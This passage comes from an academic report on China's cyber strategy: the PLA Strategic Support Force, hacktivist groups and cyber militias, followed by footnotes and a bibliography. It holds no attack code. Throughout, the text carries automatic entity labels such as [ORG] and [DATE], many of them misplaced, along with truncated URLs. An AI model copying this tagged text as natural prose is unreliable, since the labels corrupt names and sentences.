activities . See more at [FAC] China [FAC] Global [FAC] Threat [FAC] Report . Report by [ORG] CrowdStrike , [DATE] 2015 . < url content / uploads / Global_Threat_Report-2015 / China-2015 / Infographic_China-2015.html > . [CARDINAL] 139 [PERSON] Austin , [PERSON] Greg . \u2018 Cyber Security : All [GPE] China 's [ORG] Fault ? \u2019 The Globalist . [DATE] 30 [DATE] Aug. [DATE] 2015 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 140 Yao , Jianing . \u2018 PLA Cyberspace Strategic Intelligence Research Center Founded . \u2019 [GPE] China 's Military . [DATE] 30 [DATE] June [DATE] 2014 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 141 Costello , [DATE] 2016 , The [PERSON] Jamestown Foundation.24strategic \u2018 triad \u2019 of nuclear , space , and cyber forces , which were noted as the [CARDINAL] three \u2018 critical domains \u2019 in the [DATE] 2015 Defence White Paper.142While detailed information about the SSF \u2019s structure remains limited , several [NORP] Chinese military experts have commented on the new initiative . For example , a former officer [PERSON] Song [PERSON] Zhongping stated that the [ORG] SFF will be composed of [CARDINAL] three separate forces : space troops ( recognition and navigation satellites ) , cyber troops ( offensive and defensive hacking ) , and electronic warfare forces ( jamming and disrupting radars and communications ) . [CARDINAL] 143 Additionally , Rear Admiral [PERSON] Yin [PERSON] Zhuo of [ORG] the [ORG] PLA [ORG] Navy and who is believed to have direct links to the SSF \u2019s creation said in [DATE] January [DATE] 2016 that its main task will be ensuring the military \u2019s local advantages in aerospace , space , cyber , and electromagnetic battlefields through operations such as target tracking and reconnaissance , satellite navigation , and attack and defence in cyber and electromagnetic spaces \u2013 the underlying goal of which should be attaining victory in future wars . [PERSON] Yin also believes the [ORG] SSF will assume responsibilities in defending the civilian infrastructure to increase the security of [GPE] China \u2019s financial institutions as well as people \u2019s daily lives in general.144 Indeed , greater assimilation with the civilian sector seems essential in executing [GPE] China \u2019s cyber ambitions given the rapidly growing dependence on information technology as well as the potentially dangerous aspect of informatisation to the current regime . It thus appears that the [ORG] SSF will be responsible for every aspect of information warfare , including intelligence , technical reconnaissance , cyber warfare , and electronic warfare , which are central to [GPE] China \u2019s strategic thinking on asymmetric warfare and pre - emptive attack . In a larger picture , this and other ongoing military reforms aim to streamline the military activities into a \u2018 combined wartime and peacetime military footing \u2019 , which should give the country an advantageous position should a war break out against a technologically advanced opponent , such as [ORG] the [ORG] US.145 [ORG] Overall , this desired dominance in the information space forms an essential part of [GPE] China \u2019s strategic thinking , which sees paralysing and sabotaging the enemy \u2019s operational and command systems as a key to achieving dominance in all other domains , air , sea , and land.146Inevitably , the creation of the [ORG] SSF and other radical changes in the structure of the [ORG] PLA have brought about a reshuffling difficult to follow . Announced in [DATE] February [DATE] 2016 , the previous [CARDINAL] seven military area commands were regrouped into [CARDINAL] five geographical theatre commands . This also meant a reorganisation of [ORG] the [ORG] General [ORG] Staff [ORG] Department , under which 3 / PLA and 4 / PLA have so far operated , into the Joint General Staff Department , which will not have operational control of the army unlike its predecessor.147 Regarding the [ORG] SSF , it will most likely draw forces from both 3 / PLA and 4 / PLA , as well as 1 / PLA ( operations ) , [CARDINAL] 2 / PLA ( intelligence ) , and [ORG] the [ORG] Informatisation [ORG] Department , which is expected to move under the [ORG] SSF entirely . This means a significant increase in efficiency when it comes to [GPE] China \u2019s cyber - related operations , as computer network attack and defence , technical reconnaissance , espionage , electronic countermeasures , intelligence , as well as majority of communications and information management will all be operating under one command.148Overall , the creation of the [ORG] SSF is a landmark development , giving a clear indication of the PLA \u2019s focus on informationised warfare , which raises questions of whether these actions should be seen as provocative142 Costello , John . \u2018 [ORG] China [ORG] Finally [ORG] Centralizes [ORG] Its [ORG] Space , [ORG] Cyber , [ORG] Information [ORG] Forces . \u2019 The Diplomat . [DATE] 20 [DATE] Jan. [DATE] 2016 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 143 Costello , [DATE] 2016 , [ORG] The [ORG] Jamestown [ORG] Foundation . Original comments in [NORP] Chinese are available at < url 144 Costello , [DATE] 2016 , [ORG] The [ORG] Jamestown [ORG] Foundation . Original comments in [NORP] Chinese are available at < url [CARDINAL] 145 Costello , [DATE] 2016 , [ORG] The [ORG] Jamestown [ORG] Foundation . [CARDINAL] 146 Costello , [DATE] 2016 , The Diplomat . [PERSON] 147 [PERSON] Ying , [PERSON] Yu [PERSON] Lin . \u2019 The Implications of China 's Military Reforms . \u2019 The Diplomat . 7 Mar. [DATE] 2016 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url 148 Costello , [DATE] 2016 , [ORG] The [ORG] Jamestown [ORG] Foundation.25preparations for an overt conflict , or merely to provide [GPE] China with more credible deterrence in the face of technologically advanced [NORP] Western powers . The developments must also be seen in political context , as it shifts control over [GPE] China \u2019s most powerful and strategically important weapons from the army to [ORG] the [ORG] Central [ORG] Military [ORG] Commission , headed by President Xi.149Other than the [ORG] PLA cyber units , various other groups operate from the [NORP] Chinese cyberspace . Research by [PERSON] Jeffrey [PERSON] Kwong in [DATE] 2012 suggested that most of the openly confirmed attacks actually originated from such independent hacktivist units . Even though the assertion was made [DATE] more [DATE] than [DATE] four [DATE] years [DATE] ago , it should not be disregarded as it relies on data from [DATE] 1990 to [DATE] 2012 and thus enables the assertion of an interesting theory : whenever the [NORP] Chinese lack influence over foreign threats , attacks by independent units increase [GPE] China \u2019s credibility in the opponent \u2019s eyes . [PERSON] Kwong brings out clear evidence that the government \u2019s threats against another country are directly followed by widespread cyber - attacks to increase domestic and international credibility . Since the groups are uncontrolled and more nationalistic than the state , they create a risk of domestic unrest if the government should decide to retreat from its demands . Therefore , the [NORP] Chinese government faces a double threat from cyber - attacks : adopting too mild approach against the opponent could invite the attacker groups to turn against [GPE] China to express displeasure ; while letting the groups go completely untamed creates a risk of falling into a bilateral conflict with another state.150An example of such a group is [ORG] the [ORG] Red [ORG] Hacker [ORG] Alliance . The group has not been widely covered in the media , but it is believed to have a membership of [CARDINAL] several [CARDINAL] hundred [CARDINAL] thousand . It has been noted that the government tolerates and most likely even supports the group because of the large quantity of stolen data available from its members . At the same time , while [ORG] the [ORG] Red [ORG] Hacker [ORG] Alliance is afraid of a crackdown on its activities , the government fears an online rebellion by the hacktivists if it decides to oppose them.151 Overall , it is an intriguing paradox that the [NORP] Chinese government needs to address . However , despite the risk of becoming malicious against the motherland itself , or the chance of cyber incidents spiralling out of control , the groups have efficiently proven their value and are thus unlikely to fall under more serious control by the government . Slightly different from the above described organs is the so - called \u2018 cyber militias \u2019 , which consist of hackers , IT companies , scientists , network engineers , foreign language speakers , and others with useful skills . Their main mission is to take part in military exercises as part of [ORG] the [ORG] National [ORG] Emergency [ORG] Drill [ORG] Structure . However , they are not directly managed by the [ORG] PLA in order to avoid the possible ambiguity over their combatant status and activities.152 The cyber militias are seen as part of the effort to enhance civil - military cooperation within the country and were even impliedly provided with a strategic impetus in the civilian [DATE] 15 [DATE] - [DATE] year strategy issued in [CARDINAL] 2006.153 Contrary to popular belief , the groups tend to have a rather defensive nature , and conduct training missions for the [ORG] PLA operators and research on cyber warfare.154 Consisting of [CARDINAL] over [CARDINAL] eight [CARDINAL] million citizens , all related to [NORP] Chinese developmental programmes , it is a powerful force . While open source information on who controls such a large number of people remains unavailable , it is believed that the cyber militia are commanded through hierarchical layers of administration similar to a regular militia . However , the extent of the cyber militia \u2019s connections [PERSON] and149 [PERSON] For a detailed overview of the nature and the impact of the ongoing military reforms , see [PERSON] Allen , Kenneth , [PERSON] Dennis [PERSON] J. [PERSON] Blasko , and [PERSON] John [PERSON] F. [PERSON] Corbett . \u2018 The PLA \u2019s New Organizational Structure : What Is Known , Unknown and Speculation ( Part [CARDINAL] 1 ) . \u2019 [ORG] The [ORG] Jamestown [ORG] Foundation . [DATE] 4 [DATE] Feb. [DATE] 2016 . Accessed [DATE] 25 [DATE] Aug. [DATE] 2016 . < url#.V8gxG7t95aQ > . [CARDINAL] 150 [GPE] Kwong , [PERSON] Jeffrey . \u2018 State Use of nationalist [PERSON] Cyber [PERSON] Attacks as Credible Signals in [PERSON] Crisis [PERSON] Bargaining , \u2019 pp . [CARDINAL] 30 - 32 in [GPE] Lindsay , [DATE] 2012 . [CARDINAL] 151 Feakin , [DATE] 2013 , pp . [DATE] 4 [DATE] - [DATE] 5 and [GPE] Henderson , Scott . \u2018 [GPE] Beijing \u2019s Rising Hacker Stars : How Does Mother China React ? \u2019 IO Sphere ( 2008 ): pp . [CARDINAL] 25 - 30 . < url [CARDINAL] 152 [PERSON] Stevens , [PERSON] Tim . \u2018 Breaching Protocol : [WORK_OF_ART] The [WORK_OF_ART] Threat [WORK_OF_ART] of [WORK_OF_ART] Cyberespionage.\u2019Academia.edu . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url 153 Sheldon , [PERSON] Robert and [PERSON] Joe [PERSON] McReynolds . \u2018 [LAW] Chapter [LAW] 8 : Civil [ORG] - [ORG] Military [ORG] Integration and Cybersecurity , \u2019 p. [CARDINAL] 196 in [GPE] Lindsay et al . , [DATE] 2015 . [CARDINAL] 154 Sheldon , [PERSON] Robert and [PERSON] Steve [PERSON] Gilnert . \u2018 Civil - Military Integration and [GPE] China \u2019s Cyberspace Operations : Investigating [ORG] PLA [ORG] Cyber [ORG] Militias , \u2019 p. [CARDINAL] 24 in [GPE] Lindsay , [DATE] 2012 . However , as later research suggests , the cyber militia do sometimes conduct cyber attacks and cyber espionage if necessary . See more at [ORG] Sheldon and [PERSON] McReynolds , [DATE] 2015 , p. 200.26accountability to the government and the [ORG] PLA remain unclear and deserves further [ORG] examination.155As a concluding remark on the military \u2019s role regarding [GPE] China \u2019s overall use of cyberspace , it has undoubtedly achieved much in coming closer to its ultimate goal of mastering information \u2013 both foreign and domestic \u2013 to ensure the state \u2019s stability and exploit the opportunities arising from cyber espionage . Having worked hand in hand with the government , [CARDINAL] 3 / PLA and 4 / PLA had so far played a critical role in executing [GPE] China \u2019s overall ambition to catch up with Western technological development , and also obtain economic and political advantage in order to increase [GPE] China \u2019s international bargaining power . As the responsibilities of these [CARDINAL] two departments have likely been integrated into [FAC] the [FAC] Strategic [FAC] Support [FAC] Force , the efficiency of [GPE] China \u2019s state - led cyber operations is further expected to increase and the intense focus on information warfare indicates [GPE] China \u2019s ability to adapt its military force to the changing nature of international conflict . Simultaneously , the patriotic hacking units are in a way trying to help the government , but also risk harming [GPE] China \u2019s reputation and other countries \u2019 willingness to cooperate , which is already hampered by the PLA \u2019s cyber units \u2019 activities . Yet , the [NORP] Chinese government is unlikely to put a stop to further development of cyber espionage and cyber warfare capabilities , and perhaps rightfully so , looking at similar surveillance activities of its main competitors and potential adversaries on the international arena.155 For a detailed overview on cyber militia , see [PERSON] Sheldon and [PERSON] McReynolds , [DATE] 2015.27Clarke , [PERSON] Richard [PERSON] A. , and [PERSON] Robert [PERSON] K. [PERSON] Knake . Cyber War : The Next Threat to [ORG] National [ORG] Security and What to Do About It . Ecco , [DATE] 2010.Hannas , [PERSON] William [PERSON] C. , [PERSON] James [PERSON] C. [PERSON] Mulvenon , and [PERSON] Anna [PERSON] B. [PERSON] Puglisi . [NORP] Chinese Industrial Espionage : Technology Acquisitionand Military Modernization . Routledge , [DATE] 2013.Inkster , [PERSON] Nigel . [GPE] China 's [ORG] Cyber [ORG] Power . Routledge , 2016.Jiang [PERSON] Zemin [PERSON] Wenxuan ( [PERSON] Jiang [PERSON] Zemin [PERSON] Anthology ) . [GPE] Beijing , [DATE] 2006 , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 19.Kamphausen , [PERSON] Roy , [PERSON] David [PERSON] Lai , and [ORG] Travis [ORG] Tanner ( eds ) . Assessing [ORG] the People \u2019s [ORG] Liberation [ORG] Army in [ORG] the [ORG] Hu [ORG] Jintao [ORG] Era , [ORG] Strategic [ORG] Studies [ORG] Institute , [DATE] 2014 , cited in [GPE] Chang , [DATE] 2014 , p. 20.Lindsay , [PERSON] Jon [PERSON] R. , [PERSON] Tai [PERSON] Ming [PERSON] Cheung , and [PERSON] Derek [PERSON] S. [PERSON] Reveron ( eds ) [GPE] China and Cybersecurity : Espionage , Strategy andPolitics in [LOC] the [LOC] Digital [LOC] Domain . [ORG] Oxford [ORG] University [ORG] Press , [CARDINAL] 2015.Lu [ORG] Daohai , [ORG] Information [ORG] Operations . [ORG] PLA [ORG] Arts and [ORG] Literature [ORG] Press , [DATE] 1999 , p. [CARDINAL] 324 . Cited in [GPE] Mulvenon , James . \u2018 Chapter8 : [ORG] PLA [ORG] Computer [ORG] Network [ORG] Operations : Scenarios , Doctrine , Organizations , and Capability , \u2019 in [PERSON] Kamphausen , [PERSON] Roy , [PERSON] David [PERSON] Lai , and [PERSON] Andrew [PERSON] Scobell ( eds ) Beyond the Strait : PLA Missions other than [GPE] Taiwan . [ORG] Strategic [ORG] Studies [ORG] Institute , [DATE] 2009 , p. [CARDINAL] 260.Peng Guangqian and [PERSON] Yao [PERSON] Youzhi , \u2018 [LAW] Chapter [LAW] 20 : Rise of [ORG] the High [ORG] - Tech [ORG] Local [ORG] War and Its Historic Status , \u2019 in [ORG] TheScience [ORG] of [ORG] Military [ORG] Strategy , [ORG] Academy [ORG] of [ORG] Military [ORG] Science [ORG] Strategic [ORG] Research [ORG] Department . [GPE] Beijing , [DATE] 2005 , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 25.Qiao , [GPE] Liang , and [PERSON] Wang [PERSON] Xiangsui . [PERSON] Unrestricted [PERSON] Warfare . PLA Literature and Arts House , [DATE] 1999.Thomas , [PERSON] Timothy [PERSON] L. [PERSON] \u2018 [PERSON] Chapter [CARDINAL] 20 : Nation [ORG] - [ORG] State [ORG] Cyber [ORG] Strategies : Examples from [GPE] China and [GPE] Russia , \u2019 in [GPE] Kramer , [PERSON] Franklin [PERSON] D. , [PERSON] Stuart [PERSON] H. [PERSON] Starr , and [PERSON] Larry [PERSON] K. [PERSON] Wentz ( eds ) Cyberpower and [ORG] National [ORG] Security , [ORG] National [ORG] Defense [ORG] University [ORG] Press and [ORG] Potomac [ORG] Books [ORG] Inc. , [DATE] 2009 . Accessed via < url [PERSON] Timothy [PERSON] L. [PERSON] The [ORG] Dragon 's [ORG] Quantum [ORG] Leap . [ORG] Foreign [ORG] Military [ORG] Studies [ORG] Office , [DATE] 2009.Thomas , [PERSON] Timothy [PERSON] L. [PERSON] Three Faces of the Cyber Dragon . [ORG] Foreign [ORG] Military [ORG] Studies [ORG] Office , 2012.Creemers , [ORG] Rogier . \u2018 Cyber - Leninism : History , Political Culture and the Internet in [GPE] China . \u2019 ( [DATE] 2015 ) . Draft available at < url [PERSON] Robert [PERSON] S. The \u2018 Triptych of Cyber Security \u2019 : A Classification of Active Cyber Defence . Proceedings of 6thInternational Conference on [WORK_OF_ART] Cyber [WORK_OF_ART] Conflict , [GPE] Tallinn . [DATE] 2014 , pp . [DATE] 7 [DATE] - [DATE] 21 . < url Keir , and [PERSON] William [PERSON] Hagestad [PERSON] II . Divided by [PERSON] a [PERSON] Common Language : Cyber Definitions in [LANGUAGE] Chinese , [NORP] Russian andEnglish . Proceedings of [ORG] 5th [ORG] International [ORG] Conference [ORG] on [ORG] Cyber [ORG] Conflict , Tallinn . [DATE] 2013 . [ORG] NATO [ORG] CCDCOE [ORG] Publications . < url Scott . \u2018 [GPE] Beijing \u2019s Rising Hacker Stars : How Does Mother China React ? \u2019 IO Sphere ( 2008 ): pp . [CARDINAL] 25 - 30.<url Nigel . \u2018 [NORP] Chinese Intelligence in the Cyber Age . \u2019 Survival : Global Politics and Strategy 55(1 ) ( [DATE] 2013 ): pp . [CARDINAL] 45 - 66,<url february - march-2013 - 3db7/55 - 1 - 05 - inkster-936c>.Jiang , [PERSON] Li , [PERSON] Zhang [PERSON] Xiaolan , and [PERSON] Yu [PERSON] Feibao . \u2018 Deadlock in International Cooperation Regarding Cyber Security and Its Solutions . \u2019 [ORG] Xiandai Guoji Guanxi ( [ORG] Contemporary [ORG] International [ORG] Relations ) [CARDINAL] 9 ( 2013 ) , cited in [GPE] Liffran , [PERSON] Camille . \u2018 [NORP] Chinese Perspectives on [WORK_OF_ART] Cyber [WORK_OF_ART] Security [WORK_OF_ART] and [WORK_OF_ART] International [WORK_OF_ART] Relations . \u2019 [GPE] China 's Expanding Cyberspace ( [DATE] 2014 ): pp . [CARDINAL] 5 - 7 . < url [PERSON] Sylvia [PERSON] Schwaag , and Magnus Breidne . \u2018 [GPE] China \u2019s Fifteen [DATE] - Year Plan for Science and Technology : AnAssessment . \u2019 Asia Policy 4 ( [DATE] 2007 ): [DATE] 135 [DATE] - [DATE] 64 . < url science - and - technology - an - assessment.html>.2016 Global R&D Funding Forecast . Report by [ORG] Industrial [ORG] Research [ORG] Institute , ( 2016).<url Exposing [CARDINAL] One of China \u2019s Cyber Espionage Units . Report by [ORG] Mandiant , ( [CARDINAL] 2013).<url Amy . Warring State : [GPE] China \u2019s Cybersecurity Strategy . Report by [ORG] the [ORG] Center [ORG] for [ORG] a [ORG] New [ORG] American Security,2014 . < url pdf / CNAS_WarringState_Chang_report_010615.pdf>.China [ORG] Global [ORG] Threat [ORG] Report . Report by [ORG] CrowdStrike , ( [DATE] 2015 ) . < url content / uploads / Global_Threat_Report-2015 / China-2015 / Infographic_China-2015.html>.CrowdStrike [ORG] Intelligence [ORG] Report : Putter Panda . Report by [ORG] CrowdStrike , ( [DATE] 2014 ) . < url [PERSON] Ian , and [PERSON] Mark [PERSON] A. [PERSON] Stokes . [ORG] China \u2019s [ORG] Electronic [ORG] Intelligence [ORG] Satellite [ORG] Developments . Report by [ORG] Project [ORG] 2049Institute , ( [DATE] 2011 ) . < url okes.pdf>.Ernst , [PERSON] Dieter . Indigenous Innovation and Globalization \u2013 the Challenge for China \u2019s Standardization Strategy . Reportby the East - West Center , ( [DATE] 2010 ) . < url % 2010.pdf>.Feakin , Tobias . Enter the Cyber Dragon . Report by [ORG] the [ORG] Australian [ORG] Strategic [ORG] Policy [ORG] Institute , ( [CARDINAL] 2013).<url intelligence - agencies - cyber - capabilities/10_42_31_AM_SR50_chinese_cyber.pdf>.Grauman , [GPE] Brigid . Cyber - security : [WORK_OF_ART] The [WORK_OF_ART] Vexed [WORK_OF_ART] Question [WORK_OF_ART] of [WORK_OF_ART] Global [WORK_OF_ART] Rules . Report by [ORG] Security [ORG] & [ORG] Defence Agenda,(2012).Group of [ORG] Governmental [ORG] Experts [ORG] on [ORG] Developments in [ORG] the [ORG] Field [ORG] of [ORG] Information [ORG] and [ORG] Telecommunications in theContext of [ORG] International [ORG] Security . Report of [ORG] the [ORG] United [ORG] Nations [ORG] General [ORG] Assembly , ( [DATE] 2013 ) . < url [PERSON] Kimberly , and [PERSON] Craig [PERSON] Murray . [GPE] China and International Law in [PERSON] Cyberspace . Report by [ORG] the [ORG] U.S.-China [ORG] Economicand [ORG] Security [ORG] Review [ORG] Commission , ( [DATE] 2014 ) . < url ce.pdf>.29International Code of Conduct for Information Security . Report of [ORG] the [ORG] United [ORG] Nations [ORG] General [ORG] Assembly , ( 2015).<url [PERSON] Jon . [GPE] China and Cybersecurity : Political , Economic , and Strategic Dimensions . Report by [ORG] the [ORG] University [ORG] ofCalifornia [ORG] Institute [ORG] on [ORG] Global [ORG] Conflict [ORG] and [ORG] Cooperation , ( [DATE] 2012 ) . < url Workshop [ORG] - [ORG] Report [ORG] - final.aspx>.Red [ORG] Line [ORG] Drawn : China Recalculates Its Use of Cyber Espionage . Report by [ORG] FireEye , ( 2016).<url [PERSON] Mark [PERSON] A. The PLA General Staff Department [ORG] Third [ORG] Department [ORG] Second [ORG] Bureau . Report by [ORG] Project [ORG] 2049Institute , ( [DATE] 2015 ) . < url [PERSON] Mark [PERSON] A. , [PERSON] Jenny [PERSON] Lin , and [PERSON] Russell [PERSON] Hsiao . [ORG] The [ORG] Chinese People \u2019s [ORG] Liberation [ORG] Army [ORG] Signals [ORG] Intelligence and CyberReconnaissance Infrastructure . Report by [ORG] Project [ORG] 2049 [ORG] Institute , ( [DATE] 2011 ) . < url Cyber Index : International Security Trends and Realities . Report by [ORG] the [ORG] United [ORG] Nations [ORG] Institute [ORG] forDisarmament [ORG] Research , ( [DATE] 2013 ) . < url 463.pdf>.Information Office of [ORG] the [ORG] State [ORG] Council . [ORG] The [ORG] Diversified [ORG] Employment [ORG] of [ORG] China 's [ORG] Armed [ORG] Forces . Apr. 2013 . Accessed23 [DATE] Aug. [DATE] 2016 . < url [ORG] Atlantic [ORG] Treaty [ORG] Organisation . Cyber Defence Pledge . [DATE] 8 [DATE] July [DATE] 2016 . Accessed [DATE] 18 [DATE] Aug. 2016.<url\u2018China \u2019s [ORG] Perspective [ORG] on [ORG] Building [ORG] a Peaceful , Secure , [ORG] Open [ORG] and [ORG] Cooperative [ORG] Cyberspace . \u2019 UNIDIR Conference . 10Feb . [DATE] 2014 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url the - best - vehicle - for - progress - en-1 - 963.pdf>.Fu , [PERSON] Jingguang . \u2018 Policies and Practices on Network Security of MIIT . \u2019 Workshop on Cybersecurity PolicyDevelopment in the APEC Region . [GPE] Hangzhou . [CARDINAL] 27 Mar. [DATE] 2011 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url Xiaofan . \u2018 Practice and Strategy of Informatisation in [GPE] China . \u2019 State Council Informatisation Office Departmentof IT Application Promotion . [GPE] Shanghai . [DATE] 18 [DATE] Oct. [DATE] 2006 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url\u2018An Open Letter to Lu Wei and [ORG] the [ORG] Cyberspace [ORG] Administration of China.\u2019Greatfire.org . [CARDINAL] 26 [DATE] Jan. [DATE] 2015 . Accessed [DATE] 23Aug . [DATE] 2016 . < url china>.\u2018China Headed to [GPE] Overtake [GPE] EU , [GPE] US in [ORG] Science [ORG] & [ORG] Technology [ORG] Spending , [ORG] OECD [ORG] Says . \u2019 [ORG] OECD . [DATE] 12 [DATE] Nov. [DATE] 2014 . Accessed22 [DATE] Aug. [DATE] 2016 . < url spending.htm>.30\u2018China Internet Users . \u2019 Internet Live Stats , [DATE] 2016 . Web . Accessed 18 Aug. 2016.<url\u2018China [ORG] Launches [ORG] First [ORG] Cybersecurity [ORG] Organisation . \u2019 Cyber Security Review . [CARDINAL] 26 Mar. [DATE] 2016 . Accessed 23 Aug. 2016.<url\u2018Chinese [ORG] Media [ORG] Slam [ORG] Cyber [ORG] - [ORG] Hacking [ORG] Report . \u2019 [ORG] VOA . [DATE] 21 [DATE] Feb. [DATE] 2013 . Accessed [DATE] 24 [DATE] Aug. 2016.<url\u2018Chinese President [PERSON] Xi [PERSON] Jinping Calls for International Cooperation on Cyberspace Security . \u2019 The Economic Times . [DATE] 19Nov . [DATE] 2014 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url news / chinese - president - xi - jinping - calls - for - international - cooperation - on - cyberspace- security / articleshow/45205445.cms>.\u2018Cyberspace . \u2019 Defense Technical Information Center of [ORG] the [ORG] US [ORG] Department [ORG] of [ORG] Defense . Accessed [DATE] 19 [DATE] Aug. 2016.<url\u2018Gross Domestic Spending on R&D. \u2019 OECD Data . [DATE] 2016 . Accessed [DATE] 22 [DATE] Aug. [DATE] 2016 . < url\u2018Infographic : Achievements of the 2nd WIC . \u2019 China Daily . [CARDINAL] 21 [DATE] Dec. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016.<url\u2018SIPRI Military [PERSON] Expenditure [PERSON] Database . \u2019 SIPRI . [DATE] 2016 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url\u2018State Administration for Science , Technology and [ORG] Industry [ORG] for [ORG] National [ORG] Defense ( SASTIND ) . \u2019 Nuclear ThreatInitiative . [DATE] 1 [DATE] Oct. [DATE] 2011 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url\u2018The Obama - Xi Cyber Mirage . \u2019 [ORG] The [ORG] Wall [ORG] Street [ORG] Journal . [CARDINAL] 27 [DATE] Sept. [DATE] 2015 . Accessed [DATE] 19 [DATE] Aug. 2016.<url\u2018Xi Jinping : Ba wo guo cong wangluo daguo jianshe chengwei wangluo qiangguo ( Xi Jinping : From a big internetcountry to a powerful internet country ) . \u2019 Xinhuanet . 28 [DATE] Feb. [DATE] 2014 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url\u2018China : Summary of the Tenth Five [DATE] - Year [DATE] Plan ( [DATE] 2001 [DATE] - [DATE] 2005 ) \u2013 Information Industry \u2019 . Available at < url\u2018Jing Xi Jinping zhuxi pizhun zhongyang junwei yinfa \u2018 guanyu jinyibu jiaqiang jundui xinxi anquan gongzuo de yijian(Chairman of [ORG] the [ORG] Central [ORG] Military [ORG] Commission [PERSON] Xi [PERSON] Jinping approved the issuance of \u2018 Opinion on Further Strengthening Military Information Security Work \u2019 ) , \u2019 [PERSON] Jiefangjun bao ( PLA Daily ) , [DATE] 7 [DATE] Oct. [DATE] 2014 . < url 10/07 / c_1112726181.htm > , cited in [GPE] Chang , [DATE] 2014 , p. [CARDINAL] 19.Allen , [PERSON] Kenneth , [PERSON] Dennis [PERSON] J. [PERSON] Blasko , and [PERSON] John [PERSON] F. [PERSON] Corbett . \u2018 The PLA \u2019s New Organizational Structure : What Is Known , Unknown and Speculation ( Part [CARDINAL] 1 ) . \u2019 [ORG] The [ORG] Jamestown [ORG] Foundation . [DATE] 4 [DATE] Feb. [DATE] 2016 . Accessed [DATE] 25 [DATE] Aug. [DATE] 2016 . < url#.V8gxG7t95aQ>.Austin , Greg . \u2018 Cyber Security : All [GPE] China 's [ORG] Fault ? \u2019 The Globalist . [DATE] 30 [DATE] Aug. [DATE] 2015 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016.<url [PERSON] Joey . \u2018 Cyber Conflict Escalates : [ORDINAL] Second [NORP] Chinese [ORG] PLA [ORG] Hacking [ORG] Group [ORG] Accused . \u2019 Defense Systems . [DATE] 10 [DATE] June [DATE] 2014 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url unit - crowdstrike.aspx>.Chin , [PERSON] Josh . \u2018 [GPE] China Says New Internet Regulations Wo n't Increase Blocking of Foreign Websites . \u2019 The Wall StreetJournal . [CARDINAL] 30 Mar. [DATE] 2016 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url regulations - wont - increase - blocking - of - foreign - websites-1459351655>.31Costello , John . \u2018 [ORG] China [ORG] Finally [ORG] Centralizes [ORG] Its [ORG] Space , [ORG] Cyber , [ORG] Information [ORG] Forces . \u2019 The Diplomat . [DATE] 20 [DATE] Jan. [DATE] 2016 . Accessed [DATE] 24 [DATE] Aug. [DATE] 2016 . < url information - forces/>.Costello , John . \u2018 [WORK_OF_ART] The [WORK_OF_ART] Strategic [WORK_OF_ART] Support [WORK_OF_ART] Force : [GPE] China 's [ORG] Information [ORG] Warfare [ORG] Service . \u2019 [ORG] The [ORG] Jamestown [ORG] Foundation . 8Feb . [DATE] 2016 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url 54639ab2cb6bc7868e96736b6cb#.V6RA_Lt95aQ>.Creemers , Rogier . \u2018 [ORG] Cybersecurity [ORG] and [ORG] Informatisation [ORG] Leading [ORG] Group : Names and Documents . \u2019 China Copyright andMedia . [CARDINAL] 13 Mar. [DATE] 2014 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016 . < url group - names - and - documents/>.Creemers , [ORG] Rogier . \u2018 People 's [GPE] Republic [GPE] of [GPE] China Cybersecurity Law ( [ORDINAL] Second Reading Draft ) . \u2019 China Copyright andMedia . [DATE] 6 [DATE] July [DATE] 2016 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url [ORDINAL] second - reading - draft/>.Gu , Fa , \u201e [ORG] State [ORG] Council vigorously promotes the development of information technology and to effectively protectthe information security . \u2019 2012 , cited in [GPE] Giles and [GPE] Hagestad , [DATE] 2013 , pp . [TIME] 12 [TIME] - 13.Harold , [PERSON] Scott [PERSON] Warren . \u2018 The U.S.-China Cyber Agreement : A Good First Step . [ORG] \u2019 [ORG] RAND [ORG] Corporation . [DATE] July 2016.Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url step.html>.Huntsman , [PERSON] Jon . \u2018 The [CARDINAL] 100 Most Influential People : [PERSON] Lu [PERSON] Wei . \u2019 Time . 16 Apr. [DATE] 2015 . Accessed [DATE] 23 [DATE] Aug. [DATE] 2016.<url [PERSON] Roger . \u2018 A Scene from the Road to Cyber Governance : [ORG] The [ORG] Budapest [ORG] Cyberspace [ORG] Conference . \u2019 MUNKSchool of Global Affairs . [DATE] 26 [DATE] Feb. [DATE] 2013 . Accessed [DATE] 19 [DATE] Aug. [DATE] 2016 . < url scene - from - the - road - to - cyber - governance - the - budapest - cyberspace - conference/>.Jiang , [PERSON] Zemin , \u2018 Lun zhongguo xinxi jishu chanye fazhan ( On [ORG] China \u2019s [ORG] Information [ORG] Technology [ORG] Industry Development),\u2019Xinhua , [CARDINAL] 22 [DATE] Apr. [DATE] 2009 . < url cited in [GPE] Chang , [DATE] 2014 p.16.Lococo , [PERSON] Edmond , and [PERSON] Keith [PERSON] Zhai . \u2018 [GPE] China Seeks Global Internet Influence at CEO Forum on [ORG] Canal [ORG] Bank . \u2019 BloombergTechnology . [DATE] 18 [DATE] Nov. [DATE] 2014 . Accessed [DATE] 18 [DATE] Aug. [DATE] 2016 . < url [CARDINAL] 18 / china - seeks - global - internet - influence - at - ceo - forum - on - canal - bank>.Lu , Chuanying . \u2018 [GPE] China 's Emerging Cyberspace Strategy . \u2019 The Diplomat . [DATE] 24 [DATE] May 